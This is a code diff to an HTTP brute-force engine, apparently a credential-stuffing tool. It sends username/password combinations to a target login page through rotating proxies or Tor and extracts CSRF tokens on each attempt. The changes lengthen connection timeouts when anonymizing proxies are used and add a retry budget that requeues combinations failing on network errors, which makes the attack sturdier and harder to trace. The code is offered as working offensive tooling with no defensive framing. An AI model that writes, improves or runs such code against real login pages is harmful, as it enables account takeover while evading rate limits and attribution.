@@ -489,9 +489,13 @@ class HTTPAttackEngine:
                     proxy_url = random.choice(proxy_list)
                     session.proxies = {"http": proxy_url, "https": proxy_url}
 
+                # Dynamically set timeout based on proxies or Tor usage (Tor needs more time)
+                use_tor = ctx.get("use_tor", False)
+                conn_timeout = 30 if (use_tor or proxy_list) else 15
+
                 # ── Establish initial session cookies ──
                 try:
-                    init_resp = session.get(target_url, timeout=12)
+                    init_resp = session.get(target_url, timeout=conn_timeout)
                     # Extract initial CSRF token if present
                     if csrf_field:
                         init_token = _extract_csrf_token(init_resp.text, csrf_field)
@@ -553,7 +557,7 @@ class HTTPAttackEngine:
                             if csrf_field:
                                 if not current_csrf_token:
                                     try:
-                                        page_resp = session.get(target_url, timeout=10)
+                                        page_resp = session.get(target_url, timeout=conn_timeout)
                                         fresh_token = _extract_csrf_token(
                                             page_resp.text, csrf_field
                                         )
@@ -718,14 +722,30 @@ class HTTPAttackEngine:
                             self._emit_metrics()
 
                         except requests.exceptions.RequestException as e:
-                            self._log(f"[-] HTTP error: {e}")
+                            self._log(f"[-] Network error: {e}. Requeuing {user}/{pwd}...")
                             with self._metrics_lock:
                                 self.metrics["errors"] += 1
-                            with done_lock:
-                                done_count[0] += 1
-                            self._emit_progress(done_count[0], total)
-                            q.task_done()
-                            self._emit_metrics()
+
+                            combo_key = (user, pwd)
+                            with retry_lock:
+                                retry_budget[combo_key] = retry_budget.get(combo_key, 0) + 1
+                                budget_exceeded = retry_budget[combo_key] > MAX_RETRIES_PER_COMBO
+
+                            if budget_exceeded:
+                                self._log(f"[!] Retry budget exceeded for {user}/{pwd} due to network errors. Dropping combo.")
+                                with done_lock:
+                                    done_count[0] += 1
+                                self._emit_progress(done_count[0], total)
+                                q.task_done()
+                            else:
+                                # Put it back to retry later
+                                q.put((user, pwd))
+                                with self._metrics_lock:
+                                    self.metrics["requeued"] += 1
+                                q.task_done()
+                                self._emit_metrics()
+                                time.sleep(2)  # Wait 2 seconds to let Tor/proxy cool down
+                            continue
                         except Exception as ex:
                             self._log(f"[-] Worker error: {ex}")
                             with self._metrics_lock:
